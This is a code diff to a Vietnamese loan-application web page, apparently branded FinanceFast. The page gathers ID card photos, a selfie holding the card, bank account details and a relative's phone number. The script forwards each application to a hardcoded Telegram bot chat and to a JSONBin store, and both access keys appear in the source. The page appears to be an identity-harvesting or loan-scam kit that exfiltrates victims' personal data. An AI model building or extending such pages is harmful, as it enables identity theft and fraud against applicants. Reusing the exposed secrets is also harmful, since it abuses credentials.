@@ -283,17 +283,20 @@
                 <button onclick="nextStep(3)" class="w-full bg-amber-400 hover:bg-amber-500 text-slate-900 py-4 rounded-2xl font-black text-sm shadow-md transition mt-2">Tiếp Tục Xác Thực</button>
             </div>
 
-            <!-- TRANG 4: eKYC CHÂN DUNG CẦM CCCD -->
+            <!-- TRANG 4: eKYC CHÂN DUNG CẦM CCCD KÈM HƯỚNG DẪN TRỰC QUAN -->
             <div id="step4" class="space-y-4 hidden">
                 <div class="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 text-xs md:text-sm text-amber-900 space-y-1">
-                    <p class="font-black">📌 Xác thực eKYC ngân hàng:</p>
-                    <p class="text-xs text-amber-800">1. Tải lên ảnh CCCD mặt trước và mặt sau.</p>
-                    <p class="text-xs text-amber-800">2. Chụp ảnh chân dung khuôn mặt cầm kèm CCCD.</p>
+                    <p class="font-black">📌 Hướng dẫn xác thực eKYC chuẩn:</p>
+                    <p class="text-xs text-amber-800">• Đặt CCCD ngay ngắn trong khung hình sáng rõ.</p>
+                    <p class="text-xs text-amber-800">• Không để mất góc, không bị lóa sáng hay mờ chữ.</p>
                 </div>
 
                 <!-- CCCD Mặt Trước -->
                 <div class="space-y-1">
-                    <label class="block text-xs font-bold text-slate-700">Mặt Trước CCCD</label>
+                    <div class="flex justify-between items-center">
+                        <label class="block text-xs font-bold text-slate-700">1. Mặt Trước CCCD</label>
+                        <span class="text-[10px] text-amber-600 font-bold bg-amber-100 px-2 py-0.5 rounded">💡 Mẫu: Chụp đủ 4 góc</span>
+                    </div>
                     <div class="grid grid-cols-2 gap-2">
                         <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
                             📁 Tải ảnh có sẵn
@@ -309,7 +312,10 @@
 
                 <!-- CCCD Mặt Sau -->
                 <div class="space-y-1">
-                    <label class="block text-xs font-bold text-slate-700">Mặt Sau CCCD</label>
+                    <div class="flex justify-between items-center">
+                        <label class="block text-xs font-bold text-slate-700">2. Mặt Sau CCCD</label>
+                        <span class="text-[10px] text-amber-600 font-bold bg-amber-100 px-2 py-0.5 rounded">💡 Mẫu: Rõ mã vạch</span>
+                    </div>
                     <div class="grid grid-cols-2 gap-2">
                         <label class="border-2 border-dashed border-slate-300 rounded-xl p-2.5 text-center bg-slate-50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
                             📁 Tải ảnh có sẵn
@@ -325,8 +331,15 @@
 
                 <!-- ẢNH CHÂN DUNG CẦM CCCD -->
                 <div class="space-y-1">
-                    <label class="block text-xs font-bold text-slate-700">Ảnh Chân Dung Cầm CCCD</label>
-                    <div class="grid grid-cols-2 gap-2">
+                    <div class="flex justify-between items-center">
+                        <label class="block text-xs font-bold text-slate-700">3. Ảnh Chân Dung Cầm CCCD</label>
+                        <span class="text-[10px] text-emerald-700 font-bold bg-emerald-100 px-2 py-0.5 rounded">💡 Mẫu: Thấy rõ mặt & thẻ</span>
+                    </div>
+                    <div class="bg-amber-50 border border-amber-200 rounded-xl p-2.5 text-[11px] text-amber-900 flex items-center space-x-2">
+                        <span class="text-lg">📸</span>
+                        <span><b>Hướng dẫn:</b> Cầm CCCD đưa sát ngang cằm, không che mặt, chụp rõ nét đủ ánh sáng.</span>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 pt-1">
                         <label class="border-2 border-dashed border-amber-300 rounded-xl p-2.5 text-center bg-amber-50/50 hover:border-amber-400 cursor-pointer transition text-xs font-bold text-slate-700 flex items-center justify-center">
                             📁 Tải ảnh có sẵn
                             <input type="file" accept="image/*" onchange="previewSelectedImage(this, 'previewPortrait')" class="hidden">
@@ -347,7 +360,7 @@
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
                         <h2 class="text-lg font-black text-slate-900">Quản Trị Đơn Vay</h2>
-                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ đám mây chung</p>
+                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ quản trị hệ thống</p>
                     </div>
                     <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1.5 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
                 </div>
@@ -383,7 +396,7 @@
                     </div>
                     <div id="adminLoanList" class="space-y-2 max-h-60 overflow-y-auto">
                         <div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">
-                            Đang tải dữ liệu từ đám mây...
+                            Chưa có hồ sơ khách đăng ký.
                         </div>
                     </div>
                 </div>
@@ -552,12 +565,11 @@
         const BOT_TOKEN = "8813882772:AAFe5hE16dVTUDxwWEruzhNogArLgbGcoi4";
         const CHAT_ID = "8348914397";
 
-        // JSONBin Cloud Config
         const BIN_ID = "6ac700f1ac6210605a1e39af";
         const MASTER_KEY = "$2a$10$SAT05TQcAcDb/58Pr8I0eaAKleTXr75&QqrN25ICu5FRI05GAjzu";
 
         let formData = {};
-        let allLoans = [];
+        let allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
         let currentSelectedLoanId = null;
 
         let currentUser = localStorage.getItem('ff_current_user') || null;
@@ -614,28 +626,24 @@
                 let json = await res.json();
                 if(json && json.record && Array.isArray(json.record.loans)) {
                     allLoans = json.record.loans;
-                } else {
-                    allLoans = [];
+                    localStorage.setItem('ff_loans', JSON.stringify(allLoans));
                 }
             } catch(e) {
-                console.log("Lỗi tải dữ liệu đám mây", e);
+                allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             }
             if(isAdminLoggedIn) renderAdminLoanList();
         }
 
         async function saveCloudData() {
-            try {
-                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': MASTER_KEY
-                    },
-                    body: JSON.stringify({ loans: allLoans })
-                });
-            } catch(e) {
-                console.log("Lỗi lưu dữ liệu đám mây", e);
-            }
+            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+            fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': MASTER_KEY
+                },
+                body: JSON.stringify({ loans: allLoans })
+            }).catch(e => console.log("Lỗi đồng bộ mây", e));
         }
 
         function setQuickNote(text) {
@@ -696,9 +704,9 @@
             document.getElementById('totalPayment').textContent = new Intl.NumberFormat('vi-VN').format(Math.round(totalAmount)) + " ₫";
         }
 
-        window.onload = async function() { 
+        window.onload = function() { 
             calculateLoan(); 
-            await fetchCloudData();
+            fetchCloudData();
             checkLoginState();
         };
 
@@ -725,8 +733,8 @@
             }
         }
 
-        async function switchTab(tabName) {
-            await fetchCloudData();
+        function switchTab(tabName) {
+            fetchCloudData();
             document.getElementById('stepHome').classList.add('hidden');
             document.getElementById('tabLoanInfo').classList.add('hidden');
             document.getElementById('tabApplications').classList.add('hidden');
@@ -911,7 +919,7 @@
             if(!listEl) return;
             
             if(allLoans.length === 0) {
-                listEl.innerHTML = `<div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">Chưa có hồ sơ khách đăng ký mới trên đám mây.</div>`;
+                listEl.innerHTML = `<div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">Chưa có hồ sơ khách đăng ký.</div>`;
                 selectEl.innerHTML = `<option value="">-- Chưa có khách hàng nào --</option>`;
                 return;
             }
@@ -989,7 +997,7 @@
             await saveCloudData();
             renderAdminLoanList();
             closeAdminDetail();
-            showModal("Thành Công", "Đã cập nhật và lưu toàn bộ thông tin lên đám mây thành công!");
+            showModal("Thành Công", "Đã cập nhật và lưu thông tin thành công!");
         }
 
         function startLoanProcess() {
@@ -1058,10 +1066,6 @@
         }
 
         async function submitFinalData() {
-            const btn = document.getElementById('finalBtn');
-            btn.disabled = true;
-            btn.textContent = "Đang gửi hồ sơ lên đám mây...";
-
             const calculatedMonthlyPayment = document.getElementById('monthlyPayment').textContent;
 
             const newLoan = {
@@ -1089,23 +1093,20 @@
                 time: new Date().toLocaleDateString('vi-VN')
             };
 
-            await fetchCloudData();
             allLoans.unshift(newLoan);
-            await saveCloudData();
+            saveCloudData();
+
+            switchTab('applications');
 
             try {
                 const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 Mã phiên / SĐT: #${currentUser}\n💰 Số tiền vay: ${formData.amount} (${formData.term})\n💵 Đóng hàng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n📅 Ngày đóng lãi: ${formData.payDay}\n\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
                 });
-
-                switchTab('applications');
-            } catch(err) {
-                switchTab('applications');
-            }
+            } catch(err) {}
         }
     </script>
 </body>
